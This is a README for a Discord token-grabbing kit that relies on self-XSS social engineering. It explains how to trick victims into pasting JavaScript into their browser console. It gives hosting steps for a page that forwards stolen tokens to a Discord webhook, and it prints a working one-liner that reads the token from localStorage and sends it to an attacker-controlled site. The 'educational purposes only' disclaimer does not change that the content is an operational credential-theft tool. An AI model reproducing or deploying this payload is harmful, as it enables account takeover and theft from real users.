# Discord Token Grabber via Self-XSS

**Disclaimer**: This project is for **educational purposes only**. The author is not responsible for any misuse or malicious activities. Using this code to compromise accounts is against **Discord's Terms of Service** and may violate applicable laws.

---

## Table of Contents

- [Introduction](#introduction)
- [How It Works](#how-it-works)
- [Features](#features)
- [Setup Instructions](#setup-instructions)
- [Self-XSS Code](#self-xss-code)
- [Warnings](#warnings)
- [License](#license)

---

## Introduction

This repository demonstrates how to grab Discord tokens using a Self-XSS attack. The attack works by tricking users into pasting malicious JavaScript code into their browser's developer console or search tab. This method extracts the user's Discord token and sends it to a specified Discord Webhook.

---

## How It Works

The process involves two main steps:

1. **Self-XSS Exploit**:
   - A malicious JavaScript payload is provided to the victim.
   - When the victim pastes the payload into the browser console or Discord's search tab, the script extracts the Discord token from `localStorage`.

2. **Token Forwarding**:
   - The extracted token is appended as a query parameter to a URL (`https://your-site.com/index.html?site=token`).
   - The hosted `index.html` file receives the token, parses the URL, and sends the token to a Discord Webhook.

---

## Features

- **Token Extraction**: Retrieves the Discord token directly from the browser's `localStorage`.
- **Webhook Integration**: Sends the extracted token to a Discord Webhook for logging.
- **Customizable Hosting**: The `index.html` file can be hosted on any platform (e.g., GitHub Pages, Vercel, Netlify).

---

## Setup Instructions

### Step 1: Modify `index.html`
Replace `YOUR_WEBHOOK_URL` in the `index.html` file with your actual Discord Webhook URL.

### Step 2: Host the HTML File
Host the modified `index.html` on any static website hosting service, such as:
- [GitHub Pages](https://pages.github.com/)
- [Vercel](https://vercel.com/)
- [Netlify](https://www.netlify.com/)

### Step 3: Update the Self-XSS Payload
Replace `https://your-site.com` in the Self-XSS payload with the URL where your `index.html` is hosted.

---

## Self-XSS Code

Here’s a one-liner Self-XSS code that grabs the Discord token and sends it to your hosted `index.html`:

```javascript
javascript:(() => {
    let i = document.createElement('iframe');
    document.body.append(i);
    let t = JSON.parse(i.contentWindow.localStorage.token);
    window.location.href = `https://your-site.com?site=${t}`;
})();
